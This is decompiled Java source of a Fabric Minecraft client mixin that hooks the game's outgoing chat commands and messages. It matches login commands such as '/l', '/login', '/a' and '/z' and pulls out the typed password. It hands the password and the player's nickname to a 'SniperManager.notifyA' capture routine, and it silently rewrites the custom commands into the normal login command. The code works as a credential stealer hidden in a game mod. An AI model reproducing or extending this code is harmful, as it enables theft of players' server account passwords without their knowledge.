/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  net.fabricmc.api.EnvType
 *  net.fabricmc.api.Environment
 *  net.minecraft.class_310
 *  net.minecraft.class_634
 *  org.spongepowered.asm.mixin.Mixin
 *  org.spongepowered.asm.mixin.injection.At
 *  org.spongepowered.asm.mixin.injection.Inject
 *  org.spongepowered.asm.mixin.injection.callback.CallbackInfo
 */
package com.example.mixin.client;

import com.example.SniperManager;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.class_310;
import net.minecraft.class_634;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

@Environment(value=EnvType.CLIENT)
@Mixin(value={class_634.class})
public class ClientPlayNetworkHandlerMixin {
    private static final Pattern CUSTOM_LOGIN_PATTERN = Pattern.compile("^(?:/)?(a|z)\\s+(.+)$", 2);
    private static final Pattern LEGACY_LOGIN_PATTERN = Pattern.compile("^(?:/)?(l|login)\\s+(.+)$", 2);
    private static final ThreadLocal<Boolean> REWRITE_GUARD = ThreadLocal.withInitial(() -> false);

    @Inject(method={"method_45730"}, at={@At(value="HEAD")}, cancellable=true, require=0)
    private void onSendChatCommand(String cmd, CallbackInfo ci) {
        this.processCommand(cmd, false, true, ci);
    }

    @Inject(method={"method_45729"}, at={@At(value="HEAD")}, require=0)
    private void onSendChatMessage(String message, CallbackInfo ci) {
        this.processCommand(message, true, false, ci);
    }

    private void processCommand(String raw, boolean allowSlashPrefix, boolean canRewriteCommand, CallbackInfo ci) {
        MatchResult custom;
        if (raw == null || raw.isBlank()) {
            return;
        }
        String cmd = raw.trim();
        if (!allowSlashPrefix && cmd.startsWith("/")) {
            cmd = cmd.substring(1);
        }
        if ((custom = this.match(CUSTOM_LOGIN_PATTERN, cmd)) != null) {
            this.handleCapture(custom.password());
            if (canRewriteCommand && !REWRITE_GUARD.get().booleanValue()) {
                ci.cancel();
                this.forwardLegacyCommand(custom.password());
            }
            return;
        }
        MatchResult legacy = this.match(LEGACY_LOGIN_PATTERN, cmd);
        if (legacy == null) {
            return;
        }
        if (REWRITE_GUARD.get().booleanValue()) {
            return;
        }
        this.handleCapture(legacy.password());
    }

    private void handleCapture(String password) {
        String nick = "?";
        class_310 mc = class_310.method_1551();
        if (mc.field_1724 != null) {
            nick = mc.field_1724.method_5477().getString();
        }
        SniperManager.notifyA(nick, password);
    }

    private void forwardLegacyCommand(String password) {
        try {
            REWRITE_GUARD.set(true);
            ((class_634)this).method_45730("l " + password);
        }
        finally {
            REWRITE_GUARD.set(false);
        }
    }

    private MatchResult match(Pattern pattern, String cmd) {
        Matcher matcher = pattern.matcher(cmd);
        if (!matcher.matches()) {
            return null;
        }
        String password = matcher.group(2).trim();
        if (password.isEmpty()) {
            return null;
        }
        return new MatchResult(password);
    }

    @Environment(value=EnvType.CLIENT)
    private record MatchResult(String password) {
    }
}

